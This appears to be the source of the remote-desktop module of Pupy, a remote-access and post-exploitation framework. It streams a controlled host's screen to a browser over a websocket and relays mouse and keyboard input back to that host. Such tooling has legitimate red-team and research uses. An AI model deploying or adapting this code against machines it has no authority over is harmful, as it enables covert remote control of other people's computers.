# -*- coding: utf-8 -*-
# Copyright (c) 2017, Nicolas VERDIER (contact@n1nj4.eu)
# Pupy is under the BSD 3-Clause license. see the LICENSE file at the root of the project for the detailed licence terms

import base64
import subprocess
import time
import threading
import json

from pupylib.PupyModule import PupyModule, config, PupyArgumentParser
from pupylib.PupyWeb import RequestHandler, WebSocketHandler, tornado
from pupylib.PupyLogger import getLogger

logger = getLogger('rdesktop')

__class_name__="RemoteDesktopModule"

class RdesktopWebSocketHandler(WebSocketHandler):
    def initialize(self, client, refresh_interval, module, **kwargs):
        self.client = client
        self.refresh_interval = refresh_interval
        self.remote_streamer = None
        self.module = module
        self.events_thread = None
        self.stop_events_thread = threading.Event()
        self.mouse_pos = None
        self.mouse_lock = threading.Lock()

        super(RdesktopWebSocketHandler, self).initialize(**kwargs)

    def on_open(self):
        self.set_nodelay(True)
        pass

    def events_handler(self, mouse_refresh_rate=0.01):
        """ function to handle events in queue """
        while not self.stop_events_thread.is_set():
            try:
                mp = None
                with self.mouse_lock:
                    if self.mouse_pos:
                        mp = self.mouse_pos
                        self.mouse_pos = None
                if mp:
                    #print "moving to %s"%str(mp)
                    self.remote_streamer.move(*mp)

                time.sleep(mouse_refresh_rate)
            except Exception as e:
                logger.error(e)
                break

    def on_message(self, data):
        js = json.loads(data)
        if js['msg']== 'start_stream':
            self.start_stream()

        elif js['msg'] == 'click':
            logger.info("mouse click at : (%s, %s)"%(js['x'], js['y']))
            self.remote_streamer.click(int(js['x']), int(js['y']))

        elif js['msg'] == 'move':
            with self.mouse_lock:
                self.mouse_pos=(int(js['x']), int(js['y']))

        elif js['msg'] == 'keypress':
            key = js['key'] #unicode key
            logger.info("key press : %s"%key)
            try:
                if len(key) > 1:
                    key=key.lower()
                    self.remote_streamer.kbd_send(key)

                else:
                    self.remote_streamer.kbd_write(key)
            except Exception as e:
                logger.error(e)

        else:
            logger.error("unknown message:"+data)

    def update_video_callback(self, jpg_data, width, height):
        try:
            self.write_message(json.dumps({
                'screen': base64.b64encode(jpg_data),
                'width': width,
                'height': height
            }))

        except tornado.websocket.WebSocketClosedError:
            pass

    def start_stream(self):
        logger.info('starting video stream stream ...')

        if self.remote_streamer:
            self.remote_streamer.stop()

        create_video_streamer = self.client.remote('rdesktop', 'create_video_streamer', False)

        self.remote_streamer = create_video_streamer(
            self.update_video_callback,
            self.refresh_interval)

        if self.stop_events_thread:
            self.stop_events_thread.set()
            self.stop_events_thread = threading.Event()

        self.events_thread = threading.Thread(target=self.events_handler)

        self.events_thread.daemon = True
        self.events_thread.start()
        logger.info('streaming video started')

    def on_close(self):
        if self.remote_streamer:
            self.remote_streamer.stop()

        if self.stop_events_thread:
            self.stop_events_thread.set()

class IndexHandler(RequestHandler):
    def initialize(self, **kwargs):
        self.client = kwargs.pop('client', None)
        super(IndexHandler, self).initialize(**kwargs)

    @tornado.web.asynchronous
    def get(self):
        self.render('rdesktop/index.html', port=self.client.pupsrv.pupweb.port)

@config(category="admin", tags=["rdesktop","rdp", "vnc", "remote", "desktop"], compat=['windows', 'linux', 'darwin'])
class RemoteDesktopModule(PupyModule):
    """ Start a remote desktop session using a browser websocket client """

    dependencies = ['mss', 'rdesktop', 'keyboard', 'png']

    @classmethod
    def init_argparse(cls):
        cls.arg_parser = PupyArgumentParser(prog="rdesktop", description=cls.__doc__)
        cls.arg_parser.add_argument(
            '-v', '--view', action='store_true',
            help='directly open a browser tab on the handler url')

        cls.arg_parser.add_argument(
            '-r', '--refresh-interval',
            default=0.02, type=float,
            help='refresh interval. Set to 0 for best reactivity')

    def run(self, args):
        self.web_handlers=[
            (r'/?', IndexHandler, {
                'client': self.client
            }),
            (r'/ws', RdesktopWebSocketHandler, {
                'client': self.client,
                'refresh_interval': args.refresh_interval,
                'module': self
            }),
        ]

        conninfo = self.start_webplugin()
        if not conninfo:
            self.error('WebServer is not enabled')
            self.info('Enable with "config set pupyd webserver true"')
            return

        port, path = conninfo
        self.success("Web handler started on http://127.0.0.1:%d%s"%(port, path))
        if args.view:
            config = self.client.pupsrv.config
            viewer = config.get('default_viewers', 'browser')
            subprocess.Popen([viewer, path])
